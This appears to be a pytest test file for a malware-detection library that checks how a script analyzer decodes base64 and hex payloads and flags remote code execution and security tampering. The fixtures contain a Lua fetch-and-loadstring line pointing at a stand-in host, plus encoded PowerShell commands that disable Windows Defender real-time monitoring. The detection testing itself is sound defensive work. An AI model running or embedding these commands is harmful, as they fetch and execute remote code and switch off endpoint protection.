"""Only statically linked decoder inputs may become source; fixtures are inert."""

from __future__ import annotations

import base64

import pytest

from malguard_core.budget import BudgetLedger
from malguard_core.model import CoverageState, ErrorCode, EvidenceDomain
from malguard_core.scripts import analyze


BODY = 'local response = http.get("https://example.invalid/code"); loadstring(response)()'


def result(source: str, extension: str = ".lua", limits: dict[str, int] | None = None):
    return analyze(source.encode(), "synthetic", "fixture" + extension, BudgetLedger(limits))


@pytest.mark.parametrize("decoder,encoded", [
    ("base64.decode", base64.b64encode(BODY.encode()).decode()),
    ("mime.unb64", base64.b64encode(BODY.encode()).decode()),
    ("hex.decode", BODY.encode().hex()),
])
def test_explicit_decoder_to_sink_retains_remote_execution(decoder, encoded):
    stage = result(f'loadstring({decoder}("{encoded}"))()')
    harm = [item for item in stage.evidence if item.domain == EvidenceDomain.HARM]
    assert any(item.family == "REMOTE_CODE_EXECUTION" for item in harm)
    assert all(dict(item.attributes).get("decoded") for item in harm)


@pytest.mark.parametrize("source", [
    'local documentation = "{encoded}"; loadstring("return 0")()',
    'local body = "{encoded}"; loadstring(body)()',
])
def test_encoded_data_is_not_promoted_to_executable_source(source):
    encoded = base64.b64encode(BODY.encode()).decode()
    stage = result(source.format(encoded=encoded))
    assert not any(item.domain == EvidenceDomain.HARM for item in stage.evidence)


@pytest.mark.parametrize("source", [
    'loadstring(custom.decrypt("encoded content"))()',
    'local body = base64.decode([=[encoded content]=]); loadstring(body)()',
    'local body = base64.decode("invalid base64!"); loadstring(body)()',
])
def test_unresolved_decoder_blocks_complete_analysis(source):
    stage = result(source)
    assert stage.state == CoverageState.PARTIAL
    assert stage.facts["source_semantics_incomplete"]
    assert any(item.rule_id == "scripts.opacity.unresolved_decoding" for item in stage.evidence)


def test_decode_budget_failure_keeps_already_collected_harm():
    encoded = base64.b64encode(BODY.encode()).decode()
    stage = result(BODY + f'; loadstring(base64.decode("{encoded}"))()',
                   limits={"decoded_candidates": 0})
    assert stage.state == CoverageState.SKIPPED_LIMIT
    assert ErrorCode.ITERATION_BUDGET_EXHAUSTED in stage.errors
    assert any(item.family == "REMOTE_CODE_EXECUTION" for item in stage.evidence)


def test_decoded_powershell_uses_its_language_from_batch_interpreter():
    encoded = base64.b64encode(
        'Set-MpPreference -DisableRealtimeMonitoring $true'.encode("utf-16-le")
    ).decode()
    stage = result("powershell.exe -EncodedCommand " + encoded, ".bat")
    assert any(item.family == "SECURITY_TAMPERING" for item in stage.evidence)


def test_one_resolved_decoder_cannot_hide_an_unresolved_second_path():
    encoded = base64.b64encode(b"return 0").decode()
    stage = result(f'loadstring(base64.decode("{encoded}"))(); loadstring(other.decrypt("data"))()')
    assert stage.state == CoverageState.PARTIAL
    assert stage.facts["source_semantics_incomplete"]


def test_nested_dynamic_decoding_keeps_incomplete_coverage():
    inner = base64.b64encode(b"return 0").decode()
    outer = base64.b64encode(f'loadstring(base64.decode("{inner}"))()'.encode()).decode()
    stage = result(f'loadstring(base64.decode("{outer}"))()')
    assert stage.state == CoverageState.PARTIAL
    assert stage.facts["source_semantics_incomplete"]


@pytest.mark.parametrize("separator", ["\n", " & ", " ; "])
def test_first_benign_encoded_command_does_not_hide_later_harm(separator):
    benign = base64.b64encode('Write-Output harmless'.encode("utf-16-le")).decode()
    harmful_pattern = base64.b64encode(
        'Set-MpPreference -DisableRealtimeMonitoring $true'.encode("utf-16-le")
    ).decode()
    stage = result(f"powershell -enc {benign}{separator}powershell -enc {harmful_pattern}", ".cmd")
    assert any(item.family == "SECURITY_TAMPERING" for item in stage.evidence)


def test_excessive_encoded_interpreters_cannot_claim_complete_coverage():
    benign = base64.b64encode('Write-Output harmless'.encode("utf-16-le")).decode()
    stage = result("\n".join(["powershell -enc " + benign] * 17), ".cmd")
    assert stage.state == CoverageState.PARTIAL
    assert stage.facts["decoded_source_limited"]


def test_echoed_encoded_interpreter_stays_inert():
    encoded = base64.b64encode(
        'Set-MpPreference -DisableRealtimeMonitoring $true'.encode("utf-16-le")
    ).decode()
    stage = result("echo powershell -enc " + encoded, ".cmd")
    assert not any(item.domain == EvidenceDomain.HARM for item in stage.evidence)


def test_unknown_dynamic_source_does_not_invent_decoding_evidence():
    stage = result(BODY)
    assert stage.state == CoverageState.PARTIAL
    assert any(item.family == "REMOTE_CODE_EXECUTION" for item in stage.evidence)
    assert any(item.rule_id == "scripts.opacity.unresolved_dynamic_source" for item in stage.evidence)
    assert not any(item.family == "STRING_ENCRYPTION" for item in stage.evidence)
